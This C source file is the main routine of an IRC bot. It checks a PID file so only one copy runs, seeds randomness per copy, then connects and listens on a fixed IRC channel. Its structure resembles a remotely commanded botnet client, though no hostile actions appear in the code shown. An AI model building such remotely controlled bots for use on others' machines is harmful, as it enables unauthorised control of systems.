#include "../header/header.h"

int main(int argc, char *argv[]) {

	// verify if there isn't another instance of this bot
	// and sets PID file
	check_instance();

	// generate unique seed for this bot
	long long int seed;
	read(open("/dev/urandom", O_RDONLY), &seed, sizeof(seed));
	srand(seed | time(NULL));

	irc_info *info = calloc(1, sizeof(irc_info));
	info->ch = IRC_CHANNEL;
        info->port = IRC_PORT;

	if (irc_connect(info) == EXIT_SUCCESS) {
		printf("connected\n");
		if (irc_login(info) == EXIT_SUCCESS) {
			printf("logged\n");
			if (irc_listen(info) == EXIT_FAILURE) {
				perror("irc listen");
				unlink_pid_file();
				exit(EXIT_FAILURE);
			}
		} else {
			perror("irc login");
			unlink_pid_file();
			exit(EXIT_FAILURE);
		}
	} else {
		perror("irc connect");
		unlink_pid_file();
		exit(EXIT_FAILURE);
	}
	unlink_pid_file();
	return EXIT_SUCCESS;
}

void unlink_pid_file() {
	unlink(PID_FILE);
}

void check_instance() {
	FILE *file;

	// if file doesn't exists we create one and put out PID in it
	if (access(PID_FILE, F_OK) == -1) {
		file = fopen(PID_FILE, "w+");

		if (!file) {
			perror("fopen PID_FILE");
			exit(EXIT_FAILURE);
		}

		pid_t pid = getpid();
		if (fwrite(&pid, sizeof(pid), 1, file) == 0) {
			perror("fwrite pid");
			exit(EXIT_FAILURE);
		}
		#ifdef DEBUG
		printf("wrote PID file, pid = %d\n", getpid());
		#endif
	} else {
		file = fopen(PID_FILE, "r+");

		if (!file) {
			perror("reading PID_FILE");
			exit(EXIT_FAILURE);
		}

		pid_t pid;
		fread(&pid, sizeof(pid), 1, file);
		// check if process exists
		if (kill(pid, 0) == -1 && errno == ESRCH) {
			// if no, then set pid file with our PID
			fseek(file, 0, SEEK_SET);
			pid = getpid();
			fwrite(&pid, sizeof(pid), 1, file);

			#ifdef DEBUG
			printf("wrote PID file, pid = %d\n", getpid());
			#endif
		} else {
			#ifdef DEBUG
			printf("PID exists, pid = %d\n", pid);
			#endif
			// process exists then we kill ourself
			exit(EXIT_SUCCESS);
		}
	}
	fclose(file);
}

